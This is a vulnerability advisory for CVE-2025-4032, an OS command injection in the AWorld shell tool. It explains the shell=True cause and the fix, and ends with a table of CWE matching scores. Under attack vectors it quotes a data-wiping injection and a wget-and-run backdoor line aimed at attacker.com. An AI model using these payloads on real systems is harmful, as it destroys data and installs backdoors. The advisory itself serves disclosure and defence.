# Vulnerability Information: CVE-2025-4032

## Vulnerability Description
A vulnerability was found in inclusionAI AWorld up to 8c257626e648d98d793dd9a1a950c2af4dd84c4e. It has been rated as critical. This issue affects the function subprocess.run/subprocess.Popen of the file AWorld/aworld/virtual_environments/terminals/shell_tool.py. The manipulation leads to **os command injection**. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. This product does not use versioning. This is why information about affected and unaffected releases are unavailable.

### Vulnerability Description Key Phrases
- **weakness:** **os command injection**
- **product:** inclusionAI AWorld
- **version:** up to 8c257626e648d98d793dd9a1a950c2af4dd84c4e
- **component:** AWorld/aworld/virtual_environments/terminals/shell_tool.py

## CVE Reference Links Content Summary
## CVE-2025-4032 Analysis

The provided content details a vulnerability report for a potential OS Command Injection in the `shell_tool.py` file within the `inclusionAI/AWorld` GitHub repository. This directly relates to a security issue and provides detailed information about it.

**Root cause of vulnerability:**

The vulnerability stems from the use of `subprocess.run()` and `subprocess.Popen()` with `shell=True` when executing user-supplied commands. This allows an attacker to inject arbitrary commands into the input string, which are then executed by the system.

**Weaknesses/vulnerabilities present:**

*   **CWE-78: OS Command Injection:** The core vulnerability is a classic OS Command Injection due to unsafe use of shell execution.

**Impact of exploitation:**

Successful exploitation could lead to:

*   System damage
*   Data loss
*   Unauthorized access to the system (via backdoor installation)
*   Complete system compromise

**Attack vectors:**

*   An attacker can craft a malicious input string containing shell commands.
*   The vulnerability is exploitable through any interface where users can input shell commands.
*   Examples provided include using semicolons (`;`) to chain commands (e.g., `; rm -rf /`) or downloading and executing a backdoor script (e.g., `; wget http://attacker.com/backdoor.sh && sh backdoor.sh`).

**Required attacker capabilities/position:**

*   The attacker needs to be able to provide input to the application that is then passed to the vulnerable `execute` or `execute_async` methods.
*   No specific privileges are required beyond the ability to provide input.

**Mitigation or fix:**

The report does not provide a specific fix, but the core mitigation is to **avoid using `shell=True` with `subprocess.run()` and `subprocess.Popen()` when dealing with user-supplied input.** Instead, the input should be properly sanitized and passed as a list of arguments to the subprocess functions.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 78 | Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection') | Base | Allowed | alternate_terms | 1.000 |
| 2 | 77 | Improper Neutralization of Special Elements used in a Command ('Command Injection') | Class | Allowed-with-Review | alternate_terms | 0.800 |
| 3 | 89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') | Base | Allowed | sparse | 0.542 |
| 4 | 79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | Base | Allowed | sparse | 0.518 |
| 5 | 99 | Improper Control of Resource Identifiers ('Resource Injection') | Class | Allowed-with-Review | sparse | 0.482 |
| 6 | 1336 | Improper Neutralization of Special Elements Used in a Template Engine | Base | Allowed | sparse | 0.482 |
| 7 | 22 | Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') | Base | Allowed | sparse | 0.459 |
| 8 | 434 | Unrestricted Upload of File with Dangerous Type | Base | Allowed | sparse | 0.455 |
| 9 | 497 | Exposure of Sensitive System Information to an Unauthorized Control Sphere | Base | Allowed | dense | 0.598 |
| 10 | 494 | Download of Code Without Integrity Check | Base | Allowed | graph | 0.002 |

